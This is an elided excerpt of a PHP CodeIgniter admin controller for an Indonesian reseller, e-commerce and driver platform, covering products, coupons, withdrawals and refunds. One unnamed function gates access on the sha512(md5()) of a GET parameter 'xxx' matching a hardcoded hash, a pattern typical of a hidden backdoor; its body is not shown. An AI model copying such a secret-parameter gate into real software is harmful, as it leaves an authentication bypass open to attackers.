...
class Administrator extends CI_Controller
{
    ...
    function identitaswebsite()
    {
        ...
        if (isset($_POST['umum'])) {
            ...
            if ($this->input->post('fee_produk') == '') {
                $fee_produk = '0';
            } else {
                $fee_produk = $this->input->post('fee_produk');
            }
    ...
    {
        if (hash("sha512", md5(strip_tags($this->input->get('xxx')))) == 'db3f3681dddd953bd10714c0230fcd8e6b8ab595b7c816fd458df997be6985c2e2a249b241168ca0131d3254700b6c5ca9c2e96d51adef1091ef80d07b36c9d2') {
    ...
    function tambah_banner()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            if ($hasil['file_name'] == '') {
                $data = array(
                    'id_kategori_banner' => $this->db->escape_str($this->input->post('id_kategori_banner')),
                    'judul' => $this->db->escape_str($this->input->post('a')),
    ...
    function konsumen()
    {
        ...
        if (isset($_GET['s'])) {
            ...
            $data['record'] = $this->model_app->view_where_ordering('rb_konsumen', ['driver' => null], 'id_konsumen', 'desc');
        }
    ...
    function tambah_produk()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            if (cetak($this->input->post('pre_order_status')) == 'Tidak') {
                $pre_order = NULL;
            } else {
                $pre_order = cetak($this->input->post('pre_order'));
            }
    ...
    function edit_produk()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            if (config('fee_produk') == 'Y') {
                $fee_produk = simpan_rupiah($this->input->post('fee_produk'));
            } else {
                $fee_produk = $fp['fee_produk'];
            }
    ...
    function reseller_produk()
    {
        ...
        $data = array(
            'id_kategori_produk' => $rows['id_kategori_produk'],
    ...
    function kupon_save()
    {
        if (cetak($this->input->post('a')) != '') {
            $data = array(
                'id_produk' => cetak($this->input->post('id_produk')),
    ...
    function tambah_withdraw()
    {
        ...
        if (isset($_POST['submit'])) {
            if (cetak($this->input->post('jenis')) == 'debit') {
                ...
                $data = array(
                    'id_rekening_reseller' => cetak($this->input->post('a')),
                    'id_reseller' => cetak($this->input->post('id_reseller')),
                    'nominal' => $nominal,
                    'status' => 'Sukses',
                    'akun' => 'konsumen',
    ...
    function penjualan_konsumen()
    {
        ...
        if (isset($_GET['batal'])) {
            ...
            if ($cek_pembayaran['pembayaran'] == '1') {
                ...
                $data_refund = array(
                    'id_rekening_reseller' => $rek['id_rekening'],
    ...
    function tambah_ppob_margin()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            $data = array(
                'id_jenis' => ppob($this->input->post('transaksi')),
    ...
    function tambah_ongkir_driver()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            $data = array(
                'id_jenis_kendaraan' => cetak($this->input->post('a')),
    ...
    function topic_baru()
    {
        ...
        if (isset($_POST['submit'])) {
            ...
            if ($rows['files'] == '') {
                $datadb = array(
                    'id_kategori_topic' => cetak($this->input->post('id_kategori_topic')),
    ...
    {
        cek_session_akses('penawaran', $this->session->id_session);
        $data['driver'] = $this->model_app->view_where('rb_konsumen', ['driver' => 1])->result_array();
        $this->template->load('administrator/template', 'administrator/additional/mod_driver/driver', $data);
    }
    function detail_driver()
    {
        ...
        $edit = $this->model_reseller->profile_konsumen($id)->row_array();
        $data = array('rows' => $edit, 'record' => $record, 'pembelian' => $pembelian, 'penjualan' => $penjualan);
        $this->template->load('administrator/template', 'administrator/additional/mod_driver/view_driver_detail', $data);
    }
    ...
    function pesanan()
    {
        cek_session_akses('penawaran', $this->session->id_session);
        $data['driver'] = $this->model_app->view_where('rb_konsumen', ['driver' => 1])->result_array();
        $this->template->load('administrator/template', 'administrator/additional/mod_driver/pesanan', $data);
    }
    // order
}
